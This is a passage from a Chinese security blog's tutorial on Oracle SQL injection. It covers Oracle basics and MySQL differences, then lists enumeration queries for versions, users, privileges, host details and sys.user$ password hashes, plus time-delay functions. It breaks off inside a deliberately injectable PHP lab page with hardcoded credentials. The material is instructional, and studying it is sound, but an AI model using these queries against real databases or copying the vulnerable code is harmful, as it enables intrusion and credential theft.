<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>标签: SQL注入 - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Stay hungry, stay foolish."><meta property="og:type" content="blog"><meta property="og:title" content="B0urne &#039;s Blog"><meta property="og:url" content="http://b0u4ne.gihub.io/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="Stay hungry, stay foolish."><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/img/og_image.png"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io"},"headline":"B0urne 's Blog","image":["http://b0u4ne.gihub.io/img/og_image.png"],"author":{"@type":"Person","name":"B0urne"},"description":"Stay hungry, stay foolish."}</script><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">标签</a></li><li class="is-active"><a href="#" aria-current="page">SQL注入</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-02T10:00:23.000Z" title="2021-1-2 18:00:23">2021-01-02</time>发表</span><span class="level-item"><time dateTime="2021-04-11T05:48:22.552Z" title="2021-4-11 13:48:22">2021-04-11</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></span><span class="level-item">1 小时读完 (大约7723个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/">Oracle注入</a></h1><div class="content"><h1 id="Oracle-极速入门"><a href="#Oracle-极速入门" class="headerlink" title="Oracle 极速入门"></a>Oracle 极速入门</h1><p>我们可以把 Database（数据库） 看作是一个大仓库，仓库分了很多很多的房间，Schema 就是其中的房间，一个 Schema 代表一个房间，Table 可以看作是每个Schema 中的床，Table（表）被放入每个房间中，不能放置在房间之外，放在外面岂不是就是无家可归了。然后床上可以放置很多物品，就好比 Table 上可以放置很多列和行一样。数据库中存储数据的基本单元是 Table，对应现实中每个仓库放置物品的基本单位就是床， User（用户） 就是每个 Schema 的主人（所以 Schema 包含的是 Object，而不是 User），User 和 Schema 是一一对应的，每个 User 在没有特别指定下只能使用自己 Schema（房间）的东西，如果一个 User 想使用其他 Schema（房间）的东西，那就要看那个 Schema（房间）的 User（主人）有没有给你这个权限了，或者看这个仓库的老大（DBA）有没有给你这个权限了。换句话说，如果你是某个仓库的主人，那么这个仓库的使用权和仓库中的所有东西都是你的（包括房间），你有完全的操作权，可以扔掉不用的东西从每个房间，也可以放置一些有用的东西到某一个房间，你还可以给每个 User 分配具体的权限，也就是规定某 User（某人）到 某一个 Schema（某一个房间）能做些什么，是只能看（Read-Only），还是可以像房间主人一样有所有的控制权（R/W）。这个就要看这个 User 所对应的 Role（角色）了。假如你是仓库的老大（DBA），你还可以设计一张工卡（角色），分为普通用户与 vip，拥有 vip 工卡的人，可以拥有你的权限。工卡（角色）并不指代具体的用户，只是权限的集合。</p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>Oracle 中有三个重要的基本概念：<code>数据库实例</code>、<code>数据库</code>、<code>SID</code>。</p>
<p>Oracle 的数据库实例（Instance）其实是<code>后台进程</code>和 <code>SGA</code> 的总称：</p>
<ul>
<li><code>后台进程</code>：负责接受和处理客户端传来的数据，如 Windows 下由 oracle.exe 进程负责分发和处理请求。</li>
<li><code>SGA</code>：全称为 <code>System Global Area</code>，即<code>系统全局区域</code>。实际上是内存中的一片共享区域，其中包含实例配置、数据缓存、操作日志等信息，由后台进程进行共享。</li>
</ul>
<p>而通常数据库实例会用一个唯一标识来标识，这个标识符便称为 <code>SID</code>（System Identifier）。</p>
<p><code>数据库</code>一般指物理存储的文件，Oracle 数据库除了基本的数据文件，还有<code>控制文件</code>和 <code>Redo 日志</code>。数据库一般位于 <code>$ORACLE_HOME/oradata/SID</code>，SID 对应创建数据库时指定的实例 SID，数据文件以 <code>*.dbf</code> 的形式存放。</p>
<p>首先，<code>数据库实例</code>和<code>数据库</code>并不是必须相互依赖而存在的。当实例启动时，可以不关联任何数据库。数据库可以存在于磁盘，不附加到任何实例，当然这样无法与用户进行交互。一般而言，数据库附加到实例中，与其进行关联，是一对一的关系。但是在集群环境下，一个数据库可以对应多个实例，这些实例分布在不同的服务器上。但反过来，一个实例只能对应一个数据库。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="表空间"><a href="#表空间" class="headerlink" title="表空间"></a>表空间</h3><p>相对于其他数据库，Oracle 中有一个比较特殊的概念：<code>表空间</code>（Tablespace）。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库：</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102195604792.png" alt="image-20210102195604792"></p>
<p>如上图，当数据库创建时，Oracle 会默认创建五个表空间：<code>SYSTEM</code>、<code>SYSAUX</code>、<code>USERS</code>、<code>UNDOTBS</code>、<code>TEMP</code>：</p>
<ul>
<li>SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息</li>
<li>SYSAUX：类似于 <code>SYSTEM</code>，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担</li>
<li>UNDOTBS：用于事务回退等</li>
<li>TEMP：作为缓存空间减少内存负担</li>
<li>USERS：就是存储我们定义的表和数据</li>
</ul>
<h3 id="Schema"><a href="#Schema" class="headerlink" title="Schema"></a>Schema</h3><p>Oracle 数据库支持多用户，用户想在同个数据库中创建相同名称的表或其他歧义数据，该怎么办？</p>
<p>Oracle 中使用 <code>Schema</code> 的概念将每个用户的数据进行分离，Schema 其实类似于<code>命名空间</code>（Namespace），默认情况下，Schema 的名称同用户名称相同。</p>
<p><code>Schema</code>和<code>表空间</code>是一个层次的概念，它们都有一个很重要的特性，就是对表的独占性。Schema 是表的逻辑集合，是所有应用访问表必须指定的对象（一般都省略了，但是实际上一定是 <code>db.schema.table</code> 这种访问模式，例如访问 <code>scott</code> 用户下的 emp 表，这时 Schema 的名称也为 <code>scott</code>，而 <code>select from emp</code> 这条 sql 语句的完整写法为：<code>select from scott.emp</code>），同一张表不可能既属于这个 Schema，又属于另一个 Schema。表空间是表的物理集合，是所有磁盘读写必须访问的文件（一般由 Oracle 管理，个性化的需求DBA 管理），同一张表也不可能既放在这个表空间，又放在那个表空间。</p>
<h2 id="权限与用户管理"><a href="#权限与用户管理" class="headerlink" title="权限与用户管理"></a>权限与用户管理</h2><h3 id="权限和角色"><a href="#权限和角色" class="headerlink" title="权限和角色"></a>权限和角色</h3><p>Oracle 中划分了许多用户权限，权限的集合称为<code>角色</code>。例如 <code>CONNECT</code> 角色具有连接到数据库权限，<code>RESOURCE</code> 能进行基本的 <code>CURD</code> 操作（即，增加：create，修改：update，查找：read，删除：delete），<code>DBA</code> 则集合了所有的用户权限。</p>
<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>创建数据库时，会默认启用 <code>sys</code>、<code>system</code> 等用户：</p>
<ul>
<li>sys：相当于 Linux 下的 root 用户。为 <code>DBA</code> 角色</li>
<li>system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 <code>DBA</code> 角色。</li>
<li>public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）</li>
</ul>
<p>一篇比较详细的 Oracle 权限管理的博文：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yw0219/p/5855210.html">传送门🚪</a></p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>按照 MySQL 注入的学习方法，先从语法入手：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select column, group_function(column)</span><br><span class="line">from table</span><br><span class="line">[where condition]</span><br><span class="line">[group by group_by_expression]</span><br><span class="line">[having group_condition]</span><br><span class="line">[order by column];</span><br></pre></td></tr></table></figure>
<p>执行过程：from — where — group by — having — select — order by</p>
<p>可以看出，和 MySQL 很类似。实际上都是 SQL 标准的语法。</p>
<h2 id="与MySql异同"><a href="#与MySql异同" class="headerlink" title="与MySql异同"></a>与MySql异同</h2><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ul>
<li><strong>以下加了 <code>-- priv</code> 的语句说明需要管理员权限</strong></li>
<li><strong>虽然 Oracle 没有类似 MySQL 的<code>数据库</code>的概念，而是用<code>表空间</code>来代替：一个 Oracle 只有一个数据库，它给账户开辟数据库空间，称之为<code>表空间(TableSpace)</code>，创建数据库就是开辟账户的表空间。为了叙述的方便，我将 Oracle 的<code>表空间</code>也称为 <code>数据库</code></strong></li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li><p>Oracle中select 必须要指明表名。若并非对真实的表进行查询，则需要用 <code>dual</code> 作为表名，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。。</p>
</li>
<li><p>单引号与双引号：Oracle 的单引号与 MySQL 一直，但是双引号用于消除系统关键字。例如，有个表的字段叫<code>sysdate</code>，因为<code>sysdate</code>属于<code>oracle</code>中的关键字，但你要查询这个字段的时候，就需要<code>select &quot;sysdate&quot; from dual;</code>，若用 <code>select &#39;sysdate&#39; from table_name;</code>查询就相当于 <code>select sysdate from table_name;</code>，而<code>sysdate</code> 用于获得当前时间。</p>
</li>
<li><p>第 n 行的数据：<code>SELECT colmn_name FROM (SELECT ROWNUM r, table_name FROM users ORDER BY colmn_name) WHERE r=n;</code>：<code>select colmn_name from table_name limit n, 1;</code></p>
</li>
<li><p>Oracle中limit应该使用虚表中的rownum字段通过where条件判断</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from pyy where rownum &#x3D; 1;  #查询一行</span><br></pre></td></tr></table></figure></li>
<li><p>Oracel的单行注释符是–，多行注释符是/**/</p>
</li>
<li><p>拼接字符：<code>SELECT &#39;a&#39; || &#39;b&#39; FROM dual;</code>：<code>select &#39;a&#39; &#39;b&#39;</code></p>
</li>
<li><p><code>case 语法</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code>：<code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual;</code></p>
</li>
<li><p>Oracle 中空字符串<code>&#39;&#39;</code>就是<code>null</code>（也就是说，只有<code>null</code>，没有空字符），而 MySQL 是区分<code>null</code>和<code>&#39;&#39;</code>的。</p>
</li>
</ul>
<h3 id="系统表"><a href="#系统表" class="headerlink" title="系统表"></a>系统表</h3><ul>
<li>dba_tables : 系统里所有的表的信息，需要DBA权限才能查询</li>
<li>all_tables : 当前用户有权限的表的信息（只要对某个表有任何权限，即可在此视图中看到表的相关信息）</li>
<li>user_tables: 当前用户名下的表的信息</li>
<li>DBA_ALL_TABLES：<code>DBA</code> 用户所拥有的或有访问权限的对象和表</li>
<li>ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表</li>
<li>USER_ALL_TABLES：某一用户所拥有的对象和表</li>
</ul>
<p>总结：</p>
<ul>
<li><code>DBA_TABLES &gt;= ALL_TABLES &gt;= USER_TABLES</code></li>
<li><code>DBA_ALL_TABLES &gt;= ALL_ALL_TABLES &gt;= USER_ALL_TABLES</code></li>
</ul>
<p><code>user_tables</code> 的范围最小，<code>all_tables</code> 看到的东西稍多一些，而 <code>dba_tables</code> 的信息最全</p>
<p>同样，<code>user_tab_columns</code>、<code>all_tab_columns</code>、<code>dba_tab_columns</code> 也是一样的。</p>
<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>描述：<code>Oracle</code>: <code>MySQL</code></p>
<ul>
<li>服务器版本：<code>SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</code> 或者 <code>SELECT version FROM v$instance;</code>：<code>select version()</code></li>
<li>操作系统版本：<code>SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</code>: <code>@@version_compile_os</code></li>
<li>当前数据库：<code>SELECT global_name FROM global_name;</code> 或者 <code>SELECT name FROM v$database;</code>或者<code>SELECT instance_name FROM v$instance;</code>或者<code>SELECT SYS.DATABASE_NAME FROM DUAL;</code>：<code>select database()</code></li>
<li>获取当前用户权限的所有数据库：<code>SELECT DISTINCT owner, table_name FROM all_tables;</code></li>
<li>表名：<code>SELECT table_name FROM all_tables;</code>：<code>select table_name from information_schema.tables</code></li>
<li>字段名：<code>SELECT column_name FROM all_tab_columns</code>：<code>select COLUMN_NAME from information_schema.COLUMNS</code></li>
</ul>
<h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><p>描述：<code>Oracle</code>: <code>MySQL</code></p>
<ul>
<li>当前数据库用户：<code>SELECT user FROM dual;</code>: <code>user()</code></li>
<li>所有数据库用户：<code>SELECT username FROM all_users ORDER BY username;</code> 或者 <code>SELECT name FROM sys.user$; -- priv</code>：<code>select user from mysql.user;</code></li>
<li>所有数据库用户的密码 hash：<code>SELECT name, password, astatus FROM sys.user$; -- priv, &lt;= 10g</code> 或者 <code>SELECT name, spare4 FROM sys.user$; -- priv, &gt;= 11g</code>：</li>
<li>当前用户的权限：<code>SELECT * FROM session_privs;</code>：<code>show grants;</code></li>
<li>所有用户的权限：<code>SELECT * FROM dba_sys_privs -- priv</code>：<code>select Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv from mysql.user; -- priv, mysql.user 中各种以 _priv 结尾的字段</code></li>
<li>用户角色：<code>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</code> 或者 <code>SELECT DISTINCT grantee FROM dba_sys_privs</code>：<code>select user, Super_priv from mysql.user;</code></li>
</ul>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="两者相同"><a href="#两者相同" class="headerlink" title="两者相同"></a>两者相同</h4><p>数学函数  ROUND、ABS、CEIL、FLOOR、MAX、MIN</p>
<p>字符串函数  ASCII、CHAR、REPLACE、SUBSTRING、INSTR、LOCATE、LPAD、UPPER、LOWER</p>
<h4 id="两者不同"><a href="#两者不同" class="headerlink" title="两者不同"></a>两者不同</h4><p>描述：<code>Oracle</code>: <code>MySQL</code></p>
<ul>
<li>按位与：<code>SELECT bitand(6, 2) FROM dual;</code>：<code>select 6 &amp; 2</code></li>
<li>字符串转 hex：<code>select utl_raw.cast_to_raw(&#39;admin&#39;) from dual;</code>：<code>hex()</code></li>
<li>查找子串：<code>select INSTR(&#39;sdsq&#39;, &#39;s&#39;, 2) value from dual -- 要求从位置 2 开始</code>：<code>select INSTR(&#39;sdsq&#39;, &#39;s&#39;) value -- 从默认的位置 1 开始，无法改变</code></li>
<li>SUBSTR：MySQL 有，Oracle 无，但是 Oracle 可用 <code>substring</code> 代替</li>
<li>求字符长度：<code>LENGTH</code>：<code>CHAR_LENGTH</code></li>
<li>求字节长度：<code>LENGTHB</code>：<code>LENGTH</code></li>
<li>“case”：<code>select decode(&#39;s&#39;, &#39;s&#39;, &#39;n&#39;, &#39;none&#39;) from dual; -- decode(条件, 值 1, 翻译值 1, 值 2, 翻译值2 , ...值 n, 翻译值 n, 缺省值)</code>：<code>用 case 实现</code></li>
<li>时延：<code>select DBMS_PIPE.RECEIVE_MESSAGE(&#39;任意值&#39;, 1) from dual;</code>：<code>sleep(1)</code>。除此之外时延还可以利用 <code>select count(*) from all_objects;</code>来，原理是需要花费较多时间去查询所有数据库的条目。另外，利用 <code>带外通道</code> 发起网络请求，也有可能造成时延。</li>
<li>SYS_CONTEXT<br>系统启动时，在 <code>userenv</code> 中存储了一些系统上下文信息，通过 <code>SYS_CONTEXT</code> 函数，我们可以取回相应的参数值。包括当前用户名等等。<br>更多可用参数说明可以查阅 Oracle 提供的文档：<a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm">SYS_CONTEXT</a></li>
</ul>
<p>更多非函数的语句区别可以见这个博文：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yang5726685/article/details/78245742">传送门🚪</a></p>
<h1 id="常用SQL语句"><a href="#常用SQL语句" class="headerlink" title="常用SQL语句"></a>常用SQL语句</h1><h2 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version WHERE banner LIKE &#39;Oracle%&#39;;</span><br><span class="line">SELECT * from v$version WHERE rownum&#x3D;1;</span><br><span class="line">SELECT version FROM v$instance;</span><br><span class="line">select version from product_component_version;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102181505951.png" alt="image-20210102181505951"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102181749353.png" alt="image-20210102181749353"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102181630919.png" alt="image-20210102181630919"></p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102190700789.png" alt="image-20210102190700789"></p>
<p>注：v$version视图在sys表空间下，只有BANNER一列，数据库的版本就在第一行，所以一般不用like，只需<code>where rownum = 1</code>即可</p>
<p>返回的字段为：<code>Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</code></p>
<p>所以延时注入时，快速查版本号使用<code>select * from v%instance;</code>语句</p>
<h2 id="获取操作系统版本"><a href="#获取操作系统版本" class="headerlink" title="获取操作系统版本"></a>获取操作系统版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT banner FROM v$version where banner like &#39;TNS%&#39;;</span><br></pre></td></tr></table></figure>
<img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102182230971.png" alt="image-20210102182230971">

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT member from v$logfile WHERE rownum&#x3D;1; --依据路径判断服务器操作系统</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210103143809289.png" alt="image-20210103143809289"></p>
<h2 id="获取用户相关信息"><a href="#获取用户相关信息" class="headerlink" title="获取用户相关信息"></a>获取用户相关信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">获取数据库所有用户:</span><br><span class="line">SELECT user FROM dual;--获取当前数据库用户</span><br><span class="line">SELECT sys_context(&#39;userenv&#39;,&#39;current_user&#39;) from dual;--当前连接用户</span><br><span class="line">SELECT username FROM all_users ORDER BY username;--列出所有用户</span><br><span class="line">SELECT name FROM sys.user$; —- priv;列出所有用户</span><br><span class="line"></span><br><span class="line">列出所有数据库用户密码哈希:</span><br><span class="line">SELECT name, password, astatus FROM sys.user$ —- priv; &lt;&#x3D; 10g(astatus能够在acct被锁定的状态下给你反馈)</span><br><span class="line">SELECT name,spare4 FROM sys.user$ —- priv; 11g</span><br><span class="line"></span><br><span class="line">获取数据库用户权限</span><br><span class="line">SELECT * FROM session_privs; 获取当前用户权限</span><br><span class="line">SELECT * from session_roles; --当前用户的权限</span><br><span class="line">SELECT * FROM dba_sys_privs; -- priv  获取所有用户权限</span><br><span class="line"></span><br><span class="line">获取用户角色</span><br><span class="line">SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs;</span><br><span class="line"></span><br><span class="line">列出DBA账户:</span><br><span class="line">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION &#x3D; &#39;YES&#39;; —- priv</span><br><span class="line"></span><br><span class="line">获取主机名和IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name FROM dual;--主机名</span><br><span class="line">SELECT host_name FROM v$instance;--主机名</span><br><span class="line">SELECT UTL_INADDR.get_host_address FROM dual;  --查IP</span><br><span class="line">SELECT UTL_INADDR.get_host_name(&#39;127.0.0.1&#39;) FROM dual;  --查主机名称</span><br><span class="line"></span><br><span class="line">SELECT name FROM V$DATAFILE;  --获取DB文件路径</span><br></pre></td></tr></table></figure>
<h2 id="获取当前数据库-SID"><a href="#获取当前数据库-SID" class="headerlink" title="获取当前数据库(SID)"></a>获取当前数据库(SID)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT global_name FROM global_name;</span><br><span class="line">SELECT name FROM v$database;</span><br><span class="line">SELECT instance_name FROM v$instance; --服务器SID</span><br><span class="line">SELECT SYS.DATABASE_NAME FROM DUAL;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210102191024572.png" alt="image-20210102191024572"></p>
<p>global_name也是单列</p>
<h2 id="获取表名和字段名"><a href="#获取表名和字段名" class="headerlink" title="获取表名和字段名"></a>获取表名和字段名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT DISTINCT owner FROM all_tables; --列出所有数据库名</span><br><span class="line">SELECT table_name FROM all_tables; --获取所有表名</span><br><span class="line">SELECT owner, table_name FROM all_tables;--获取当前用户权限的所有表名</span><br><span class="line">SELECT column_name FROM all_tab_columns; --所有获取字段名</span><br><span class="line">SELECT column_name FROM all_tab_columns WHERE TABLE_NAME&#x3D;&#39;ADMIN&#39;;</span><br></pre></td></tr></table></figure>
<p>distinct去重</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select TABLESPACE_NAME FROM USER_TABLESPACES;--查看所有的表空间</span><br><span class="line">select TABLE_NAME from USER_TABLES WHERE ROWNUM&#x3D;1;--查看当前用户的所有表</span><br><span class="line">select column_name from user_tab_columns where table_name&#x3D;&#39;DEMO&#39;;--查看当前用户的所有的列，如查询DEMO表下的所有列</span><br><span class="line">SELECT object_name from user_objects;--查看当前用户的所有对象（表名称，约束、索引）</span><br></pre></td></tr></table></figure>


<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用Kitematic搜索oracle11</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105153614638.png" alt="image-20210105153614638"></p>
<p>安装后查看配置文件和DOC说明</p>
<p><img src="/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/image-20210105153547054.png" alt="image-20210105153547054"></p>
<p>随便启动一个apache</p>
<p>ORACLE注入PHP-demo如下：</p>
<p>修改其中的HOST、PORT和SID和依据自己的数据库随便一条注入语句即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">  header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">  $id &#x3D; @$_GET[&#39;id&#39;];</span><br><span class="line">  &#x2F;&#x2F;$conn &#x3D; oci_connect(&#39;system&#39;,&#39;Aa123456&#39;);</span><br><span class="line">  $dbstr &#x3D;&quot;(DESCRIPTION &#x3D;(ADDRESS &#x3D; (PROTOCOL &#x3D; TCP)(HOST &#x3D;127.0.0.1)(PORT &#x3D; 32773)) (CONNECT_DATA &#x3D; (SERVER &#x3D; DEDICATED) (SERVICE_NAME &#x3D; xe) (INSTANCE_NAME &#x3D; xe)))&quot;; &#x2F;&#x2F;连接数据库的参数配置 </span><br><span class="line">  $conn &#x3D; oci_connect(&#39;system&#39;,&#39;oracle&#39;,$dbstr);&#x2F;&#x2F;连接数据库，前两个参数分别是账号和密码</span><br><span class="line">  if (!$conn)</span><br><span class="line">  &#123;</span><br><span class="line">    $Error &#x3D; oci_error();&#x2F;&#x2F;错误信息</span><br><span class="line">    print htmlentities($Error[&#39;message&#39;]);</span><br><span class="line">    exit;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    echo &quot;&lt;h2&gt;Oracle 注入实验&lt;&#x2F;h2&gt;&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#x2F;&#x2F;ocilogoff($conn);</span><br><span class="line">	</span><br><span class="line">    